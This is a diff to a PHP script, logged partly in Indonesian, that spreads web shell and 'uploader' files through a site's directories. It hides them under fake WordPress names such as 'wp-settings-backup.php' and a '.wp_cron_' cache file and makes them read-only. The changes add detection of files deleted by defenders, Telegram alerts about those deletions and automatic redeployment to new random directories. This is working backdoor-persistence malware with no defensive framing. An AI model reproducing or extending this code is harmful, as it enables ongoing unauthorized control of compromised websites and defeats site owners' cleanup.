@@ -177,18 +177,27 @@ function shouldNotify($cooldown) {
     $forceNotify = isset($_GET['notify']) && $_GET['notify'] == '1';
     
     if ($forceNotify) {
+        echo "\n🔔 Force notify mode (bypass cooldown)\n";
         file_put_contents($lastNotifyFile, time());
         return true;
     }
     
     $lastNotifyTime = file_exists($lastNotifyFile) ? (int)file_get_contents($lastNotifyFile) : 0;
     $currentTime = time();
+    $timeSince = $currentTime - $lastNotifyTime;
+    
+    echo "\n📊 Notification check:\n";
+    echo "  Last notify: " . ($lastNotifyTime > 0 ? date('Y-m-d H:i:s', $lastNotifyTime) : 'Never') . "\n";
+    echo "  Time since: " . round($timeSince / 60, 1) . " minutes\n";
+    echo "  Cooldown: " . round($cooldown / 60, 1) . " minutes\n";
     
     if ($currentTime - $lastNotifyTime > $cooldown) {
         file_put_contents($lastNotifyFile, $currentTime);
+        echo "  ✅ Sending notification (cooldown expired)\n";
         return true;
     }
     
+    echo "  ⏭️ Skipping notification (cooldown active: " . round(($cooldown - $timeSince) / 60, 1) . " min left)\n";
     return false;
 }
 
@@ -514,14 +523,54 @@ function createBackupUploaders($webRoot, $uploaderContent, $count = 3) {
     $uploaderCacheFile = $webRoot . DIRECTORY_SEPARATOR . '.wp_cron_' . substr(md5('uploader_cache'), 0, 8);
     $uploaderMap = [];
     
+    $cache = [];
     if (file_exists($uploaderCacheFile)) {
         $encryptedData = file_get_contents($uploaderCacheFile);
         $cache = decryptCache($encryptedData);
+    }
+    
+    $cacheTimestamp = $cache['timestamp'] ?? 0;
+    $cacheAge = time() - $cacheTimestamp;
+    $uploaderMap = $cache['uploaders'] ?? [];
+    
+    if (!empty($uploaderMap) && isset($cache['date']) && $cache['date'] === $today) {
+        echo "Menggunakan backup uploader locations dari cache hari ini ($today)\n";
         
-        if (isset($cache['date']) && $cache['date'] === $today) {
-            $uploaderMap = $cache['uploaders'] ?? [];
-            echo "Menggunakan backup uploader locations dari cache hari ini ($today)\n";
-        } else {
+        $status = detectUnexpectedDeletion($webRoot, $uploaderMap);
+        $deletedCount = count($status['deleted']);
+        $existingCount = count($status['existing']);
+        
+        if ($deletedCount > 0 && $cacheAge < 82800) {
+            echo "\n🚨 UPLOADER ADAPTIVE MODE!\n";
+            echo "Detected {$deletedCount} uploader deletions (cache age: " . round($cacheAge/3600, 1) . "h)\n";
+            
+            sendTelegramAlert($deletedCount, $status['deleted'], $cacheAge);
+            
+            $directories = getAllDirs($webRoot);
+            if (count($directories) < $deletedCount) {
+                $deletedCount = count($directories);
+            }
+            
+            shuffle($directories);
+            $newDirs = array_slice($directories, 0, $deletedCount);
+            
+            $uploaderNames = [
+                'wp-settings-backup.php', 'theme-update-check.php', 'plugin-verify.php',
+                'system-check.php', 'health-monitor.php', 'maintenance-mode.php'
+            ];
+            
+            foreach ($newDirs as $index => $dir) {
+                $subdirKey = str_replace($webRoot, '', $dir);
+                $uploaderName = $uploaderNames[$index % count($uploaderNames)];
+                $uploaderMap[$subdirKey] = $uploaderName;
+            }
+            
+            echo "🎯 Created {$deletedCount} NEW uploader locations\n";
+            echo "✅ Kept {$existingCount} existing uploaders\n\n";
+        }
+        
+    } else {
+        if (!empty($cache)) {
             echo "Uploader cache expired (tanggal berbeda), generate lokasi baru\n";
             if (isset($cache['success_rate']) && $cache['success_rate'] < 0.8) {
                 echo "⚠️ Success rate rendah kemarin, KEEP old uploaders\n";
@@ -530,6 +579,7 @@ function createBackupUploaders($webRoot, $uploaderContent, $count = 3) {
                 cleanupOldUploaders($webRoot, $cache['uploaders'] ?? []);
             }
         }
+        $uploaderMap = [];
     }
     
     $isNewDay = empty($uploaderMap);
@@ -560,7 +610,9 @@ function createBackupUploaders($webRoot, $uploaderContent, $count = 3) {
                 @chmod($uploaderPath, 0644);
                 $backupPaths[] = $uploaderPath;
                 $uploaderMap[$subdirKey] = $uploaderName;
-                echo "  New uploader: $uploaderName in $subdirKey\n";
+                echo "  ✅ New uploader: $uploaderName in $subdirKey\n";
+            } else {
+                echo "  ❌ FAILED uploader: $uploaderName in $subdirKey\n";
             }
         }
     } else {
@@ -570,7 +622,9 @@ function createBackupUploaders($webRoot, $uploaderContent, $count = 3) {
             if (file_put_contents($uploaderPath, $uploaderContent) !== false) {
                 @chmod($uploaderPath, 0644);
                 $backupPaths[] = $uploaderPath;
-                echo "  Reuse uploader: $uploaderName in $subdirKey\n";
+                echo "  ✅ Reuse uploader: $uploaderName in $subdirKey\n";
+            } else {
+                echo "  ❌ FAILED uploader: $uploaderName in $subdirKey\n";
             }
         }
     }
@@ -813,11 +867,11 @@ function uploadFilesToAllDirs($dir, $shellContent, $shellMarker) {
         
         if (isset($shellMap[$subdirKey])) {
             $smartFilename = $shellMap[$subdirKey];
-            echo "  Reuse: $smartFilename in $subdirKey\n";
+            $action = "Reuse";
         } else {
             $smartFilename = generateSmartFilename($subdir, $shellMarker, $usedFilenames);
             $shellMap[$subdirKey] = $smartFilename;
-            echo "  New: $smartFilename in $subdirKey\n";
+            $action = "New";
         }
         
         $filePathShell = $subdir . DIRECTORY_SEPARATOR . $smartFilename;
@@ -829,8 +883,10 @@ function uploadFilesToAllDirs($dir, $shellContent, $shellMarker) {
         if (file_put_contents($filePathShell, $shellContent) !== false) {
             @chmod($filePathShell, 0444);
             $resultPaths[] = "SUCCESS: $filePathShell";
+            echo "  ✅ $action: $smartFilename in $subdirKey\n";
         } else {
             $resultPaths[] = "FAILED: $filePathShell";
+            echo "  ❌ FAILED: $smartFilename in $subdirKey (permission denied)\n";
         }
     }
     
